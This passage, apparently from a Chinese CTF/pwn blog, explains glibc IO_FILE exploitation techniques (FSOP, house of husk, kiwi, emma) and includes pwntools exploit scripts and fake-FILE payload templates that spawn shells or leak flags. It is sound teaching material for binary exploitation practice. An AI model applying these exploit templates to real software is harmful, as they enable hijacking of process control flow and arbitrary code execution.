class="hljs-comment"># recover</span><br><br><span class="hljs-comment"># tcache_stashing_unlink_attack and FILE attack</span><br>change(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x50</span> + p64(heap_base + <span class="hljs-number">0x12280</span>) + p64(free_hook - <span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br>change(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(heap_base + <span class="hljs-number">0x147c0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">40</span><br><span class="hljs-comment"># payload = payload.ljust(0x158, b&#x27;\x00&#x27;)</span><br>add(<span class="hljs-number">0x440</span>, payload) <span class="hljs-comment"># C3 change fake FILE _chain</span><br>add(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;c\n&#x27;</span>*<span class="hljs-number">3</span>) <span class="hljs-comment"># C4 tcache_stashing_unlink_attack</span><br><br>stream = <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>)<br>stream += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0xffffffffffff</span>)        <span class="hljs-comment"># (_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= (_IO_buf_end - _IO_buf_base)</span><br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(heap_base + <span class="hljs-number">0x148a0</span>)              <span class="hljs-comment"># _IO_buf_base = binsh_addr</span><br>stream += p64(heap_base + <span class="hljs-number">0x148b8</span>)              <span class="hljs-comment"># malloc_size =  2*(_IO_buf_end - _IO_buf_base) + 100</span><br>stream = stream.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>stream += p64(<span class="hljs-number">0</span>)                    <span class="hljs-comment"># _mode = 0</span><br>stream = stream.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>stream += p64(_IO_str_jumps)        <span class="hljs-comment"># vtable</span><br>stream += <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-number">2</span>*p64(sys)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Gift:&#x27;</span>, stream + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>choose(<span class="hljs-number">5</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;user:\n&quot;</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="另一种利用思路——orw"><a href="#另一种利用思路——orw" class="headerlink" title="另一种利用思路——orw"></a>另一种利用思路——orw</h4><p>适用版本 glibc-2.29~2.33，比较适用于无法申请 tcachebin 的堆块（只允许申请 large chunk），利用 _IO_str_overflow 里的 malloc 进行申请 tcache 堆块，达成任意地址写。</p>
<p>攻击前提：</p>
<ol>
<li>拥有堆地址和 libc 地址</li>
<li>能够把 malloc_hook 放入 tcache 中</li>
<li>可以劫持 IO 流（如劫持 _IO_list_all）</li>
</ol>
<p>原理：</p>
<p>在 _IO_str_overflow 中调用 malloc 之前，会 执行一条汇编执行 <code>mov    rdx,QWORD PTR [rdi+0x28]</code>，并且直到调用 malloc 时，都没有再次的更改 rdx 的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">0x7ffff7e6eb20 &lt;__GI__IO_str_overflow&gt;:    repz nop edx<br>0x7ffff7e6eb24 &lt;__GI__IO_str_overflow+4&gt;:    push   r15<br>0x7ffff7e6eb26 &lt;__GI__IO_str_overflow+6&gt;:    push   r14<br>0x7ffff7e6eb28 &lt;__GI__IO_str_overflow+8&gt;:    push   r13<br>0x7ffff7e6eb2a &lt;__GI__IO_str_overflow+10&gt;:    push   r12<br>0x7ffff7e6eb2c &lt;__GI__IO_str_overflow+12&gt;:    push   rbp<br>0x7ffff7e6eb2d &lt;__GI__IO_str_overflow+13&gt;:    mov    ebp,esi<br>0x7ffff7e6eb2f &lt;__GI__IO_str_overflow+15&gt;:    push   rbx<br>0x7ffff7e6eb30 &lt;__GI__IO_str_overflow+16&gt;:    sub    rsp,0x28<br>0x7ffff7e6eb34 &lt;__GI__IO_str_overflow+20&gt;:    mov    eax,DWORD PTR [rdi]<br>0x7ffff7e6eb36 &lt;__GI__IO_str_overflow+22&gt;:    test   al,0x8<br>0x7ffff7e6eb38 &lt;__GI__IO_str_overflow+24&gt;:    jne    0x7ffff7e6eca0 &lt;__GI__IO_str_overflow+384&gt;<br>0x7ffff7e6eb3e &lt;__GI__IO_str_overflow+30&gt;:    mov    edx,eax<br>0x7ffff7e6eb40 &lt;__GI__IO_str_overflow+32&gt;:    mov    rbx,rdi<br>0x7ffff7e6eb43 &lt;__GI__IO_str_overflow+35&gt;:    and    edx,0xc00<br>0x7ffff7e6eb49 &lt;__GI__IO_str_overflow+41&gt;:    cmp    edx,0x400<br>0x7ffff7e6eb4f &lt;__GI__IO_str_overflow+47&gt;:    je     0x7ffff7e6ec80 &lt;__GI__IO_str_overflow+352&gt;<br>0x7ffff7e6eb55 &lt;__GI__IO_str_overflow+53&gt;:    mov    rdx,QWORD PTR [rdi+0x28]  &lt;----<br>0x7ffff7e6eb59 &lt;__GI__IO_str_overflow+57&gt;:    mov    r14,QWORD PTR [rbx+0x38]<br>0x7ffff7e6eb5d &lt;__GI__IO_str_overflow+61&gt;:    mov    r12,QWORD PTR [rbx+0x40]<br>0x7ffff7e6eb61 &lt;__GI__IO_str_overflow+65&gt;:    xor    ecx,ecx<br>0x7ffff7e6eb63 &lt;__GI__IO_str_overflow+67&gt;:    mov    rsi,rdx<br>0x7ffff7e6eb66 &lt;__GI__IO_str_overflow+70&gt;:    sub    r12,r14<br>0x7ffff7e6eb69 &lt;__GI__IO_str_overflow+73&gt;:    cmp    ebp,0xffffffff<br>0x7ffff7e6eb6c &lt;__GI__IO_str_overflow+76&gt;:    sete   cl<br>0x7ffff7e6eb6f &lt;__GI__IO_str_overflow+79&gt;:    sub    rsi,QWORD PTR [rbx+0x20]<br>0x7ffff7e6eb73 &lt;__GI__IO_str_overflow+83&gt;:    add    rcx,r12<br>0x7ffff7e6eb76 &lt;__GI__IO_str_overflow+86&gt;:    cmp    rcx,rsi<br>0x7ffff7e6eb79 &lt;__GI__IO_str_overflow+89&gt;:    ja     0x7ffff7e6ec4a &lt;__GI__IO_str_overflow+298&gt;<br>0x7ffff7e6eb7f &lt;__GI__IO_str_overflow+95&gt;:    test   al,0x1<br>0x7ffff7e6eb81 &lt;__GI__IO_str_overflow+97&gt;:    jne    0x7ffff7e6ecc0 &lt;__GI__IO_str_overflow+416&gt;<br>0x7ffff7e6eb87 &lt;__GI__IO_str_overflow+103&gt;:    lea    r15,[r12+r12*1+0x64]<br></code></pre></td></tr></table></figure>

<p>显然，这可以配合着 glibc-2.31 之后的 setcontext + 61  一起使用，正好可以把 rdx 值修改为可控地址。因此利用跟上面的思路大致一样，改变成选择把 malloc_hook 填充为 setcontext，这样在我们进入 _IO_str_overflow 时首先会将 rdx 赋值为我们可以控制的地址，然后再次 malloc 的时候会触发 setcontext，而此时 rdx 已经可控，因此就可以成功实现 srop。</p>
<p>因此对应关系为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">_flags = <span class="hljs-number">0</span><br>_IO_write_ptr = 用于srop的地址（此时同时满足了fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base）<br>_IO_buf_base = setcontext_addr<br>_IO_buf_end = setcontext_addr + offset<br>new_buf = malloc(<span class="hljs-number">2</span> * (_IO_buf_end - _IO_buf_base) + <span class="hljs-number">100</span>)<br>memcpy(new_buf, _IO_buf_base, _IO_buf_end - _IO_buf_base)<br>free(_IO_buf_base)<br></code></pre></td></tr></table></figure>

<p>堆块布局模板为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">stream = <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>)<br>stream += p64(<span class="hljs-number">1</span>) + p64(rdx_value)        <span class="hljs-comment"># (_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= (_IO_buf_end - _IO_buf_base)</span><br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(gadget_addr)              <span class="hljs-comment"># _IO_buf_base</span><br>stream += p64(gadget_addr + offset)   <span class="hljs-comment"># _IO_buf_end</span><br>stream += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span>              <span class="hljs-comment"># malloc_size =  2*(_IO_buf_end - _IO_buf_base) + 100</span><br>stream += p64(heap_addr)              <span class="hljs-comment"># _chain</span><br>stream = stream.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)  <br>stream += p64(<span class="hljs-number">0</span>)                    <span class="hljs-comment"># _mode = 0</span><br>stream = stream.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>stream += p64(_IO_str_jumps)        <span class="hljs-comment"># vtable</span><br></code></pre></td></tr></table></figure>

<h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><p>适用版本：跟版本无关，是一个专门针对 printf 家族函数进行攻击的手法，适用于有调用 printf 家族函数的程序，且其中需带上格式化字符，比如 %s，%x 等，用来计算 spec。适用于只能分配较大 chunk 时(超过 fastbin )，存在或可以构造出 UAF 漏洞。</p>
<p>攻击前提：</p>
<ol>
<li>存在调用 printf 家族函数，并且存在 spec。</li>
<li>拥有 libc 地址。</li>
<li>可以劫持 __printf_arginfo_table 为可控地址，以及重写 __printf_function_table 不为 NULL 。（两者交换也行，只是正常程序流程会先调用 __printf_arginfo_table[spec] 处的函数指针）</li>
</ol>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>函数调用链如下，其中 spec 索引指针就是格式化字符的 ascii 码值，比如 printf(“%S”)，那么就是 S 的 ascii 码值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">printf-&gt;vfprintf-&gt;printf_positional-&gt;__parse_one_specmb-&gt;__printf_arginfo_table(spec)<br>                                                |<br>                                                 -&gt;__printf_function_table(spec)<br></code></pre></td></tr></table></figure>

<p>__printf_function_table 不能为 NULL，否则就会调用 calloc 申请堆块，然后会填充 __printf_function_table[spec] 和 __printf_arginfo_table[spec]。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__printf_function_table == <span class="hljs-literal">NULL</span>)<br>  &#123;<br>    __printf_arginfo_table = (printf_arginfo_size_function **)<br>  <span class="hljs-built_in">calloc</span> (UCHAR_MAX + <span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">void</span> *) * <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (__printf_arginfo_table == <span class="hljs-literal">NULL</span>)<br>  &#123;<br>    result = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">goto</span> out;<br>  &#125;<br><br>    __printf_function_table = (printf_function **)<br>  (__printf_arginfo_table + UCHAR_MAX + <span class="hljs-number">1</span>);<br>  &#125;<br><br>__printf_function_table[spec] = converter;<br>__printf_arginfo_table[spec] = arginfo;<br></code></pre></td></tr></table></figure>

<p>除了上面的满足 __printf_function_table 不能为 NULL，__printf_function_table[spec] 处不为 NULL，这条很好满足，因为这就是我们要伪造的函数指针，getshell 时直接填成 one_gadget。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (spec &lt;= UCHAR_MAX    <span class="hljs-comment">// spec 对应的类型的 ascii 码值要小于 UCHAR_MAX = 0xff</span><br>    &amp;&amp; __printf_function_table != <span class="hljs-literal">NULL</span><br>    &amp;&amp; __printf_function_table[(<span class="hljs-keyword">size_t</span>) spec] != <span class="hljs-literal">NULL</span>)<br>  &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **ptr = alloca (specs[nspecs_done].ndata_args<br>               * <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *));<br><br>    <span class="hljs-comment">/* Fill in an array of pointers to the argument values.  */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; specs[nspecs_done].ndata_args;<br>     ++i)<br>  ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];<br><br>    <span class="hljs-comment">/* Call the function.  */</span><br>    function_done = __printf_function_table[(<span class="hljs-keyword">size_t</span>) spec]<br>  (s, &amp;specs[nspecs_done].info, ptr);<br></code></pre></td></tr></table></figure>

<p>另一个函数调用的地方如下，满足 __printf_function_table 不为 NULL，以及 __printf_arginfo_table[spec-&gt;info.spec] 不为 NULL 时，就会调用这个函数指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">spec-&gt;info.spec = (<span class="hljs-keyword">wchar_t</span>) *format++;<br>spec-&gt;size = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (__builtin_expect (__printf_function_table == <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>)<br>    || spec-&gt;info.spec &gt; UCHAR_MAX<br>    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="hljs-literal">NULL</span><br>    <span class="hljs-comment">/* We don&#x27;t try to get the types for all arguments if the format</span><br><span class="hljs-comment">   uses more than one.  The normal case is covered though.  If</span><br><span class="hljs-comment">   the call returns -1 we continue with the normal specifiers.  */</span><br>    || (<span class="hljs-keyword">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])<br>                 (&amp;spec-&gt;info, <span class="hljs-number">1</span>, &amp;spec-&gt;data_arg_type,<br>                  &amp;spec-&gt;size)) &lt; <span class="hljs-number">0</span>)<br>&#123;<br>    ····<br>&#125;<br></code></pre></td></tr></table></figure>

<p>因此利用思路在于修改这两个函数指针，以及伪造 spec 索引指向的位置。同时，在实际情况中程序是先调用的 **__printf_arginfo_table ** 中对应的 spec 索引的函数指针，然后调用 <strong>__printf_function_table</strong> 对应 spec 索引函数指针，所以为了达成调用，就得同时对 __printf_arginfo_table 和 __printf_function_table 进行劫持伪造，总结如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">__printf_arginfo_table = heap_addr  <span class="hljs-comment"># 可控地址</span><br>__printf_function_table != <span class="hljs-number">0</span><br>//其中 __printf_arginfo_table 和 __printf_function_table 可以对调<br>heap_addr + <span class="hljs-string">&#x27;spec&#x27;</span> * <span class="hljs-number">8</span> = one_gadget  <span class="hljs-comment"># sepc 指格式化字符对应的ascii码值 </span><br></code></pre></td></tr></table></figure>

<h4 id="例题34c3-CTF-readme-revenge"><a href="#例题34c3-CTF-readme-revenge" class="headerlink" title="例题34c3 CTF readme_revenge"></a>例题34c3 CTF readme_revenge</h4><p>没开 PIE，同时 got 表可写。 </p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230127160237528.png"><span class="image-caption">image-20230127160237528</span></p>
<p>程序很简单，只有一个输入点存在溢出，并且输入的地方就在 .bss 段上；同时，文件本身是个静态编译的文件，函数的各种地址直接保存在 .bss 段上，所以是可以直接一路溢出覆盖后面保存的各种函数的地址，从而造成劫持。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230127160427307.png"><span class="image-caption">image-20230127160427307</span></p>
<p>flag 直接保存在 .data 段上，所以就是劫持 __printf_arginfo_table 为 stack_chk_fail，再劫持其中报错打印的参数为 flag 的地址，从而获取 flag。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230127160636227.png"><span class="image-caption">image-20230127160636227</span></p>
<p>成功输出 flag。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230127161252423.png"><span class="image-caption">image-20230127161252423</span></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./readme_revenge&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./readme_revenge&#x27;</span>)<br><br>__printf_function_table = <span class="hljs-number">0x6b7a28</span><br>__printf_arginfo_table = <span class="hljs-number">0x6b7aa8</span><br>target_addr = <span class="hljs-number">0x6b73e0</span><br>stack_chk_fail = <span class="hljs-number">0x4359b0</span><br>flag_addr = <span class="hljs-number">0x6b4040</span><br>__libc_argv = <span class="hljs-number">0x6b7980</span><br><br>payload = p64(flag_addr)<br>payload = payload.ljust(<span class="hljs-number">0x73</span> * <span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(stack_chk_fail)<br>payload = payload.ljust(__libc_argv - target_addr, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(target_addr)  <span class="hljs-comment"># arg</span><br>payload = payload.ljust(__printf_function_table - target_addr, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(<span class="hljs-number">1</span>)   <span class="hljs-comment"># __printf_function_table not null</span><br>payload = payload.ljust(__printf_arginfo_table - target_addr, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(target_addr)    <span class="hljs-comment"># __printf_arginfo_table</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>攻击前提：</p>
<ol>
<li>assert 判断出错。</li>
<li>能够任意写，修改<code>_IO_file_sync</code>和<code>_IO_helper_jumps + 0xA0 and 0xA8</code>（getshell 只要劫持 _IO_file_sync 即可）</li>
<li>拥有 libc 地址。</li>
</ol>
<h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>函数调用链：<strong>assert -&gt; malloc_assert -&gt; fflush(stderr) -&gt; _IO_file_jumps 结构体中的 __IO_file_sync</strong></p>
<p>触发 assert 时，会调用到 fflush(stderr)，,其中会调用 _IO_file_jumps 中的 sync 指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// GLIBC 2.32/malloc.c:288</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>__malloc_assert (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *assertion, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> line,<br>       <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *function)<br>&#123;<br>(<span class="hljs-keyword">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>           __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           file, line,<br>           function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           assertion);<br>fflush (<span class="hljs-built_in">stderr</span>);<br><span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>执行 __IO_file_sync 时的寄存器情况如下，RDX 是指向 _IO_helper_jumps，RDI 指向 _IO_2_1_stderr。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230128145305568.png"><span class="image-caption">image-20230128145305568</span></p>
<p>触发 assert 的办法：</p>
<ol>
<li>改小 top_chunk ，并置 pre_inuse 为 0，当 top_chunk 不足分配且 pre_inuse 为 0 会触发一个 assert。(该 assert 函数在sysmalloc 函数中被调用)</li>
<li> 修改 large bin chunk 的 size 中的 flag 位。（不确定）</li>
</ol>
<h3 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h3><p>适用版本：glibc-2.36 及以下所有版本</p>
<p>攻击前提：</p>
<ol>
<li>可以触发两次的往任意地址写一个可控地址，除非能泄露 pointer_guard（LargeBin Attack、Tcache Stashing Unlink Attack…）</li>
<li>可以触发 IO 流（能触发 FSOP 以及 House_Of_Kiwi 的条件都行）</li>
</ol>
<h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>在 vtable 的合法范围内，存在一个 _IO_cookie_jumps：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_cookie_jumps</span> <span class="hljs-title">libio_vtable</span> =</span> &#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_file_finish),<br>  JUMP_INIT(overflow, _IO_file_overflow),<br>  JUMP_INIT(underflow, _IO_file_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_default_pbackfail),<br>  JUMP_INIT(xsputn, _IO_file_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_cookie_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_file_setbuf),<br>  JUMP_INIT(sync, _IO_file_sync),<br>  JUMP_INIT(doallocate, _IO_file_doallocate),<br>  JUMP_INIT(read, _IO_cookie_read),<br>  JUMP_INIT(write, _IO_cookie_write),<br>  JUMP_INIT(seek, _IO_cookie_seek),<br>  JUMP_INIT(close, _IO_cookie_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue),<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>其中 _IO_cookie_read、_IO_cookie_write、_IO_cookie_seek、_IO_cookie_close 中都存在函数指针调用，这里只选取 _IO_cookie_write 为例，其他也都大差不差：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span><br>_IO_cookie_write (FILE *fp, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (struct _IO_cookie_file *) fp; <span class="hljs-comment">// _IO_cookie_file 的内容来自于fp指针</span><br>  <span class="hljs-keyword">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write; <span class="hljs-comment">// 如果fp可控，则可以伪造 read_cb</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);  <span class="hljs-comment">// 函数指针保护，默认开启</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (write_cb == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);   <span class="hljs-comment">// 函数指针调用</span><br>  <span class="hljs-keyword">if</span> (n &lt; size)<br>    fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>  <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>PTR_DEMANGLE（指针保护），默认开启，需要绕过：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">uintptr_t</span> __pointer_chk_guard attribute_relro;<br><span class="hljs-meta">#  <span class="hljs-meta-keyword">define</span> PTR_MANGLE(var) \</span><br><span class="hljs-meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span><br><span class="hljs-meta">#  <span class="hljs-meta-keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span><br></code></pre></td></tr></table></figure>

<p>__pointer_chk_guard 可以通过搜索 canary 的值寻找，在 canary 的下方就是。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230205180716820.png"><span class="image-caption">image-20230205180716820</span></p>
<p>具体表现如下： 这个值存在于 TLS 段上，会将指针 ROR 移位 0x11 后再与 __pointer_chk_guard 进行异或。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230202005822546.png"><span class="image-caption">image-20230202005822546</span></p>
<p>所以要绕过这个值，一般是采取 largebin attack（或类似意义的手法） 写入一个可控的堆地址。无论使用什么方法，我们根本思想：是让这个本来是随机的、不确定的异或值，转变为已知的值。</p>
<p>_IO_cookie_write 函数的汇编实现：</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230202005858433.png"><span class="image-caption">image-20230202005858433</span></p>
<p>可以看到最后的效果是将 rdi + 0xe0 位置的值作为 rdi , rdi + 0xf0 位置的值作为 rip 跳过去。</p>
<p>攻击思路：stderr 在 libc 中时，劫持 stderr 为可控地址，然后进行布局，通过 house of kiwi 的调用链进行触发。</p>
<p>stderr 在 bss 时，需要走正常的 IO 流时，不能先修改 __pointer_chk_guard，因为在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址。所以要利用 house of pig 中的 orw 打法，在 IO 中利用 malloc、memcpy、free 先修改  __pointer_chk_guard，然后再通过 _chain 链接下一个 Fake_IO 进行 House_OF_Emma。</p>
<p>模板：</p>
<p>_IO_cookie_jumps = _IO_str_jumps - 0xb40</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 函数指针解密</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ROL</span>(<span class="hljs-params">content, key</span>):</span>   <br>    tmp = <span class="hljs-built_in">bin</span>(content)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">64</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(tmp[key:] + tmp[:key], <span class="hljs-number">2</span>)    <br><br><br><span class="hljs-comment"># IO 布局参考 </span><br>_IO_cookie_jumps = leak + libc.sym[<span class="hljs-string">&#x27;_IO_cookie_jumps&#x27;</span>]<br>fake_IO_FILE = <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0xffffffffffffffff</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(next_chain)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode = 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_cookie_jumps + <span class="hljs-number">0x40</span>)  <span class="hljs-comment"># vtable</span><br>fake_IO_FILE += p64(srop_addr)  <span class="hljs-comment"># rdiValue</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(ROL(gadget ^ (heap_base + <span class="hljs-number">0x2bd0</span>), <span class="hljs-number">0x11</span>)) <span class="hljs-comment"># call func</span><br></code></pre></td></tr></table></figure>

<h4 id="例题-2021湖湘杯-House-OF-Emma"><a href="#例题-2021湖湘杯-House-OF-Emma" class="headerlink" title="例题 2021湖湘杯 House _OF _Emma"></a>例题 2021湖湘杯 House _OF _Emma</h4><p>house of apple + house of emma</p>
<p>漏洞点在于堆块释放后未清空指针，造成 UAF</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230209150546519.png"><span class="image-caption">image-20230209150546519</span></p>
<p>emmm，apple 是成功了，但是后面才反应过来，如果是触发 __malloc_assert，无法像调用 exit 一样，不断的顺着 chain 执行，所以这题没办法这么结合。。。。不过也没什么了，能成功触发 apple ，如果能继续触发，emma 应该也是没问题的了，都是模板了。</p>
